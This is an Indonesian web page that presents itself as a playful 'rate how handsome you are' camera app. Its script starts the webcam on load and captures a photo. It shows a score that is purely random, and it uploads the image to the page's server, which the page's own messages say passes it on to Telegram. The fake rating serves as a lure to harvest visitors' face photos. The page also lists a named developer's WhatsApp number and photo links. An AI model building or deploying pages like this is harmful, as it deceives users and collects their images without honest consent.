<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Rate Ganteng</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
    body {
      min-height: 100vh;
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      display: flex; flex-direction: column; justify-content: center; align-items: center;
      color: #fff; overflow: hidden; animation: fadeIn 1.2s ease;
    }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px);} to { opacity: 1; transform: translateY(0);} }
    h1 { font-size: 2rem; margin-bottom: 10px; background: linear-gradient(90deg, #00ffcc, #ff00ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    p { color: #bbb; font-size: 1rem; margin-bottom: 20px; }
    .cam-container {
      position: relative; background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px);
      border: 2px solid rgba(255, 255, 255, 0.1); border-radius: 16px; padding: 20px;
      box-shadow: 0 0 25px rgba(0, 255, 150, 0.3); display: flex; flex-direction: column; align-items: center;
    }
    video {
      width: 100%; max-width: 380px; border-radius: 12px;
      border: 2px solid rgba(255, 255, 255, 0.2);
      box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
    }
    button {
      background: linear-gradient(90deg, #00ffcc, #ff00ff); border: none; color: white;
      padding: 14px 28px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer;
      margin-top: 15px; transition: 0.3s; box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
    }
    button:hover { transform: scale(1.05); box-shadow: 0 0 25px rgba(255, 0, 255, 0.5); }
    #log {
      margin-top: 20px; font-size: 14px; color: #0f0; background: rgba(255, 255, 255, 0.05);
      padding: 10px 20px; border-radius: 10px; max-width: 380px; text-align: left;
      overflow-y: auto; max-height: 150px; box-shadow: inset 0 0 10px rgba(0, 255, 100, 0.2);
    }
    .rate-box {
      margin-top: 15px; font-size: 1.5rem; font-weight: bold;
      text-shadow: 0 0 15px rgba(255,255,255,0.6); animation: glow 2s infinite alternate;
    }
    @keyframes glow {
      from { color: #00ffcc; text-shadow: 0 0 10px #00ffcc; }
      to { color: #ff00ff; text-shadow: 0 0 15px #ff00ff; }
    }
    .menu-btn {
      position: absolute; top: 20px; right: 25px; font-size: 26px; cursor: pointer; color: #fff;
      background: rgba(255, 255, 255, 0.1); border-radius: 50%; padding: 6px 12px; transition: 0.3s;
    }
    .menu-btn:hover { background: rgba(255, 255, 255, 0.2); transform: rotate(90deg); }
    .modal {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%; backdrop-filter: blur(12px);
      background: rgba(0, 0, 0, 0.6); display: none; justify-content: center; align-items: center; z-index: 100;
    }
    .modal-content {
      background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 20px; padding: 30px; text-align: center; max-width: 420px; width: 90%;
    }
    .gallery { display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; margin-bottom: 20px; }
    .gallery img {
      width: 100px; height: 100px; object-fit: cover; border-radius: 10px;
      transition: 0.3s; border: 2px solid rgba(255, 255, 255, 0.1);
    }
    .gallery img:hover { transform: scale(1.08); box-shadow: 0 0 20px rgba(0, 255, 255, 0.4); }
    .wa-btn { display: inline-block; background: linear-gradient(90deg, #25D366, #128C7E); color: white;
      padding: 12px 20px; border-radius: 10px; text-decoration: none; font-weight: bold; transition: 0.3s;
    }
    .wa-btn:hover { box-shadow: 0 0 15px rgba(37, 211, 102, 0.6); transform: translateY(-2px); }
    .close-btn { position: absolute; top: 20px; right: 25px; font-size: 24px; color: #fff; cursor: pointer; }
  </style>
</head>
<body>
  <div class="menu-btn" onclick="openModal()">...</div>

  <h1>Rate Ganteng</h1>
  <p>Izinkan kamera dulu buat cek seberapa ganteng kamu</p>

  <div class="cam-container">
    <video id="video" autoplay playsinline></video>
    <button id="snapBtn" onclick="snap()" disabled>Ambil Foto</button>
    <div id="rateBox" class="rate-box"></div>
  </div>

  <div id="log"></div>

  <div class="modal" id="devModal">
    <div class="modal-content">
      <div class="close-btn" onclick="closeModal()">X</div>
      <h2>Ananda Ryu Dell</h2>
      <p>Album Developer Image</p>
      <div class="gallery">
        <img src="https://files.catbox.moe/s8xdc6.jpg" alt="Foto 1">
        <img src="https://files.catbox.moe/0ek01h.jpg" alt="Foto 2">
        <img src="https://files.catbox.moe/h7ldfj.jpg" alt="Foto 3">
      </div>
      <a class="wa-btn" href="https://wa.me/6285749361189" target="_blank">Hubungi Developer</a>
    </div>
  </div>

  <script>
    const video = document.getElementById('video');
    const btn = document.getElementById('snapBtn');
    const log = document.getElementById('log');
    const modal = document.getElementById('devModal');
    const rateBox = document.getElementById('rateBox');

    function msg(text) {
      log.innerHTML += `<p>${new Date().toLocaleTimeString()}: ${text}</p>`;
      log.scrollTop = log.scrollHeight;
    }

    async function startCam() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        btn.disabled = false;
        msg('Kamera aktif, siap menilai ganteng kamu.');
      } catch (err) {
        msg('Gagal akses kamera: ' + err.message);
      }
    }

    function snap() {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      const imageData = canvas.toDataURL('image/png').split(',')[1];
      msg('Foto diambil, mengirim ke server...');

      const rate = Math.floor(Math.random() * 101);
      let text;
      if (rate > 85) text = `${rate}% Ganteng Parah`;
      else if (rate > 60) text = `${rate}% Lumayan Ganteng`;
      else if (rate > 40) text = `${rate}% Ganteng Standar`;
      else text = `${rate}% Perlu Skincare Nih`;
      rateBox.innerHTML = text;

      fetch('/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: imageData })
      })
      .then(res => res.json())
      .then(data => {
        if (data.success) msg('Foto berhasil dikirim ke server & Telegram!');
        else msg('Gagal kirim: ' + data.error);
      })
      .catch(err => msg('Error jaringan: ' + err.message));
    }

    function openModal() { modal.style.display = 'flex'; }
    function closeModal() { modal.style.display = 'none'; }

    window.onload = startCam;
  </script>
</body>
  </html>
